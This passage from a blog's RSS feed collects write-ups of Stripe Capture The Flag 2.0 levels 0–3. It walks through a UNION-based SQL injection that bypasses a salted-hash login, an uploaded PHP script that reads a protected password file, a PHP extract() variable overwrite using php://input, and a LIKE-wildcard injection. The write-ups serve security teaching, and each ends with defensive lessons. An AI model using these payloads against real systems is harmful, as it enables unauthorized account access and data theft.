&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here&amp;rsquo;s the code for the server (Python finally!)
&lt;script src=&#34;//gist.github.com/kevinjqiu/3747632.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;&amp;hellip;and here&amp;rsquo;s the front-end:
&lt;script src=&#34;//gist.github.com/kevinjqiu/3747637.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;From the description, we know that we need to break into bob&amp;rsquo;s account to retrieve the password to level 4, although breaking into eve and mallory&amp;rsquo;s accounts are attempting :) Afterall, who wouldn&amp;rsquo;t want to know the proof of &lt;a href=&#34;http://en.wikipedia.org/wiki/P_versus_NP_problem&#34;&gt;P=NP&lt;/a&gt; or how to make a &lt;a href=&#34;http://en.wikipedia.org/wiki/Perpetual_motion_machine&#34;&gt;perpetual motion machine&lt;/a&gt;?&lt;/p&gt;

&lt;p&gt;Anyhow, the front-end is a typical login page: you get username and password input fields, and they&amp;rsquo;re sent off (via POST) to a server script.
The server is a simple Flask app that gets the user input, checks them against a table of username and salted password hashes.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;login()&lt;/code&gt; function is where all the action takes place. Line 86 quickly caught my eyes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;query = &amp;quot;&amp;quot;&amp;quot;SELECT id, password_hash, salt FROM users WHERE username = &#39;{0}&#39; LIMIT 1&amp;quot;&amp;quot;&amp;quot;.format(username)
cursor.execute(query)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is an alarming pattern of formatting a string and sending it off to &lt;code&gt;cursor.execute()&lt;/code&gt;. Python&amp;rsquo;s string &lt;code&gt;format()&lt;/code&gt; method is just another way of interopolation. It&amp;rsquo;s exactly the same as &lt;code&gt;&amp;quot;&amp;quot;&amp;quot;SELECT id, password_hash, salt FROM user WHERE username = %s&amp;quot;&amp;quot;&amp;quot; % username&amp;quot;&amp;quot;&amp;quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now that we found the vulnerability, we need to find a way exploit it.&lt;/p&gt;

&lt;h3 id=&#34;take-1&#34;&gt;Take 1&lt;/h3&gt;

&lt;p&gt;Normally, with SQL injection, you craft an input to terminate the previous statement, and inject the statement you want it to execute. Reading the code, it&amp;rsquo;s getting the user&amp;rsquo;s password hash and salt for the given user, and check it against the input hash and salt. The hashing method is &lt;a href=&#34;http://en.wikipedia.org/wiki/SHA-2&#34;&gt;sha256&lt;/a&gt;. With Python, we can quickly pre-calculate a salted hash to inject. Here&amp;rsquo;s an example, with password &lt;code&gt;1&lt;/code&gt; and salt &lt;code&gt;a&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python -c &amp;quot;import hashlib; print hashlib.sha256(&#39;1&#39;+&#39;a&#39;).hexdigest()&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and we get &lt;code&gt;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The statement we really want it to execute is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT id, &#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;, &#39;a&#39; FROM users WHERE username = &#39;bob&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;so when we put &amp;lsquo;1&amp;rsquo; in the password input box, we will get the server to run sha246 on &amp;lsquo;1&amp;rsquo; + &amp;lsquo;a&amp;rsquo;, and check it against the hash that we fed in. The entire query gets executed wil look like this (with the middle line being the &lt;code&gt;username&lt;/code&gt; we feed in):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT id, password_hash, salt FROM users WHERE username = &#39;
&#39;; SELECT id,  &#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;, &#39;a&#39; FROM users WHERE username=&#39;bob
&#39; LIMIT 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;How does that faire?&lt;/p&gt;

&lt;p&gt;Unfortunately, we get a stack trace in the traceback:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Traceback (most recent call last):
  File &amp;quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&amp;quot;, line 1689, in wsgi_app
    response = self.make_response(self.handle_exception(e))
  File &amp;quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&amp;quot;, line 1687, in wsgi_app
    response = self.full_dispatch_request()
  File &amp;quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&amp;quot;, line 1360, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &amp;quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&amp;quot;, line 1358, in full_dispatch_request
    rv = self.dispatch_request()
  File &amp;quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&amp;quot;, line 1344, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File &amp;quot;/Users/kevin/src/ctf/level03-code/secretvault.py&amp;quot;, line 91, in login
    cursor.execute(query)Warning: You can only execute one statement at a time.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;cursor&lt;/code&gt; cannot run more than one statement at a time! Smart, eh?&lt;/p&gt;

&lt;h3 id=&#34;take-2&#34;&gt;Take 2&lt;/h3&gt;

&lt;p&gt;So the trick here is to use exactly 1 statement to inject our crafted data. We still want this to be returning the same fields. What if I &lt;code&gt;UNION&lt;/code&gt; two queries, with the second query selecting the injected data?&lt;/p&gt;

&lt;p&gt;So something like this (the middle line is the one we inject as &lt;code&gt;username&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT id, password_hash, salt FROM users WHERE username = &#39;
bob&#39; UNION select id, &#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;, &#39;a&#39; FROM users WHERE username = &#39;bob
&#39; LIMIT 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Submit, and boom:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Welcome back! Your secret is: &amp;quot;...&amp;quot; (Log out)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is a canonical SQL injection. Again, NEVER trust user input. Always sanitize user input.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Stripe Capture The Flag 2.0 - Problem 2</title>
      <link>http://blog.idempotent.ca/2012/09/12/stripe-capture-the-flag-2.0---problem-2/</link>
      <pubDate>Wed, 12 Sep 2012 23:50:00 +0000</pubDate>
      
      <guid>http://blog.idempotent.ca/2012/09/12/stripe-capture-the-flag-2.0---problem-2/</guid>
      <description>

&lt;h2 id=&#34;level-2&#34;&gt;Level 2&lt;/h2&gt;

&lt;script src=&#34;//gist.github.com/kevinjqiu/3711719.js?file=index.php&#34;&gt;&lt;/script&gt;

&lt;p&gt;In level 2, we&amp;rsquo;re faced with a PHP app that allows you to upload a &amp;ldquo;profile picture&amp;rdquo;. The password to level 3 is contained in a &amp;ldquo;password.txt&amp;rdquo; file of the document root, as revealed in line 49. Of course, you won&amp;rsquo;t be able to click on the link and get the file. The directory is protected, and we have to somehow exploit the code.&lt;/p&gt;

&lt;p&gt;Reading through the code, it&amp;rsquo;s a clear that whatever file uploaded to the server will be under &lt;code&gt;uploads/&lt;/code&gt;, and the file is publicly accessible through &lt;code&gt;&amp;lt;base&amp;gt;/uploads/&amp;lt;your_file_name&amp;gt;&lt;/code&gt;, as seen on line 37. The file input is expecting a image file, but it doesn&amp;rsquo;t restrict the type of file it accepts. What if we upload a PHP script, read the file content &lt;code&gt;../password.txt&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;With that in mind, I quickly cooked up a PHP script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
echo file_get_contents(&#39;../password.txt&#39;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;uploaded it and hit it with curl. Guess what? The password is right there in the clear!&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;There&amp;rsquo;s a few problems with this app:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The user shouldn&amp;rsquo;t be able to upload files of any type they want. Restrict to only image files if you&amp;rsquo;re expecting profile pictures.&lt;/li&gt;
&lt;li&gt;The above point is necessary but not sufficient. The bigger problem is that the server is not properly configured. Files under &lt;code&gt;uploads/&lt;/code&gt; folder should be considered &amp;ldquo;user input&amp;rdquo; and thus should not be able to be executed on the server. Much more exploits can be done here and as it turns out, some later levels require the control of this machine.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Stripe Capture The Flag 2.0 - Problem 1</title>
      <link>http://blog.idempotent.ca/2012/09/10/stripe-capture-the-flag-2.0---problem-1/</link>
      <pubDate>Mon, 10 Sep 2012 14:14:00 +0000</pubDate>
      
      <guid>http://blog.idempotent.ca/2012/09/10/stripe-capture-the-flag-2.0---problem-1/</guid>
      <description>

&lt;h2 id=&#34;level-1&#34;&gt;Level 1&lt;/h2&gt;

&lt;p&gt;Now we get to level 1. We are presented with a simple web form with the PHP code powering it.&lt;/p&gt;

&lt;script src=&#34;//gist.github.com/kevinjqiu/3692642.js?file=index.php&#34;&gt;&lt;/script&gt;

&lt;p&gt;The PHP script checks if the input combination matches the combination in &amp;lsquo;secret-combination.txt&amp;rsquo; file, and present the user with the password to the next level if the combinations match.  Obviously, we&amp;rsquo;re not going to guess the combination.&lt;/p&gt;

&lt;p&gt;There are a few &amp;lsquo;handy&amp;rsquo; methods in PHP that are extremely dangerous. &lt;a href=&#34;http://php.net/manual/en/function.extract.php&#34;&gt;&lt;code&gt;extract&lt;/code&gt;&lt;/a&gt; is one of them. It will extract the content of the passed-in associative array, and import them into the global scope. e.g., &lt;code&gt;extract(array(&#39;foo&#39;=&amp;gt;&#39;bar&#39;));&lt;/code&gt; will make a global variable &lt;code&gt;$foo&lt;/code&gt;. What&amp;rsquo;s more dangerous is that if you already have a variable named &lt;code&gt;$foo&lt;/code&gt;, it will be overwritten with the new value in the associative array.&lt;/p&gt;

&lt;p&gt;Because the secret combination&amp;rsquo;s location is stored in &lt;code&gt;$filename&lt;/code&gt; variable, we need to somehow manipulate the input to point &lt;code&gt;$filename&lt;/code&gt; to something else.  Looking at line 27:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;form action=&amp;quot;#&amp;quot; method=&amp;quot;GET&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the form is submitted using GET! So manipulating the variable is as easy as sending the endpoint with query param &lt;code&gt;filename=&amp;lt;xyz&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, what will the &lt;code&gt;xyz&lt;/code&gt; be? The &lt;code&gt;$filename&lt;/code&gt; variable is passed into &lt;code&gt;file_get_contents()&lt;/code&gt; function. The parameter to the function is simply a string, and PHP defined a few &amp;lsquo;handy&amp;rsquo; &lt;a href=&#34;http://php.net/manual/en/wrappers.php.php&#34;&gt;streams&lt;/a&gt;. &lt;code&gt;php://input&lt;/code&gt; caught my eyes. The doc says &lt;code&gt;php://input is a read-only stream that allows you to read raw data from the request body.&lt;/code&gt;. Hey, the form is submitted using GET, so there won&amp;rsquo;t be a request body. The input parameter is also sent using GET variable &lt;code&gt;attempt&lt;/code&gt;, so I just need to send an empty &lt;code&gt;attempt&lt;/code&gt; and point the filename to &lt;code&gt;php://input&lt;/code&gt;: &lt;code&gt;?attempt=&amp;amp;filename=php://input&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&amp;hellip;And indeed it works!&lt;/p&gt;

&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;Never, ever use &lt;code&gt;extract()&lt;/code&gt; in serious applications. Historically, PHP is used to build simple websites so it included many functions that puts &amp;ldquo;convenience&amp;rdquo; over security. Global variables are a bad idea, and having the ability to pollute the global space from any input is way worse.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file_get_contents()&lt;/code&gt; has the ability to take any string as parameter, including some named streams. They are handy but they pose potential threats.&lt;/li&gt;
&lt;li&gt;Again, don&amp;rsquo;t trust user input!&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Stripe Capture The Flag 2.0 - Problem 0</title>
      <link>http://blog.idempotent.ca/2012/09/09/stripe-capture-the-flag-2.0---problem-0/</link>
      <pubDate>Sun, 09 Sep 2012 23:11:00 +0000</pubDate>
      
      <guid>http://blog.idempotent.ca/2012/09/09/stripe-capture-the-flag-2.0---problem-0/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://stripe.com&#34;&gt;Stripe&lt;/a&gt; just finished running a second &lt;a href=&#34;https://stripe-ctf.com&#34;&gt;&amp;ldquo;capture the flag&amp;rdquo;&lt;/a&gt; challenge. They ran a similar challenge this February and was more focused on system level. This time, it&amp;rsquo;s full-on web security.&lt;/p&gt;

&lt;p&gt;In the next few posts, I&amp;rsquo;m going to discuss the problems in the challenge, how I solved them and what did I learn from from each challenge.&lt;/p&gt;

&lt;h2 id=&#34;problem-0&#34;&gt;Problem 0&lt;/h2&gt;

&lt;p&gt;Here are the code for level 0:&lt;/p&gt;

&lt;p&gt;&lt;script src=&#34;//gist.github.com/kevinjqiu/3688655.js?file=level00.js&#34;&gt;&lt;/script&gt;
&lt;script src=&#34;//gist.github.com/kevinjqiu/3688659.js?file=level00.html&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;So you have a node.js server script, with an HTML front-end. The front-end allows you to submit a web form which allows you to retrieve &lt;em&gt;your&lt;/em&gt; stored secret but the secret to level 1 is also stored in the same database.&lt;/p&gt;

&lt;p&gt;Reading the code, the query on line 34 jumps out at you:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;    var query = &#39;SELECT * FROM secrets WHERE key LIKE ? || &amp;quot;.%&amp;quot;&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Even though I&amp;rsquo;m not too familiar with &lt;a href=&#34;http://nodejs.org&#34;&gt;nodejs&lt;/a&gt; or its db API, the part where it concatenates user input with &amp;ldquo;.%&amp;rdquo; looks suspicious. &lt;code&gt;||&lt;/code&gt; is the SQL operator for concatenation, and &amp;lsquo;%&amp;rsquo; is the SQL wildcard that matches 0 or more characters of any kind. What if my user input is &amp;ldquo;%&amp;rdquo;?&lt;/p&gt;

&lt;p&gt;Voilà! That&amp;rsquo;s it! &lt;code&gt;%.%&lt;/code&gt; gives you all passwords with namespace that has a dot in the middle.&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://xkcd.com/327/&#34;&gt;SQL-injection&lt;/a&gt; is a known security issue for a long time yet you&amp;rsquo;d be surprised how many sites are still subject to such exploits. The problem with level 0 code is exactly that: unsanitized user input is sent directly to the database for execution. So everytime a string concatenation is seen in a SQL statement, you have to ask yourself: is the ting being concatenated trustworthy? Use prepared statement or your database&amp;rsquo;s escape function wherever possible.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>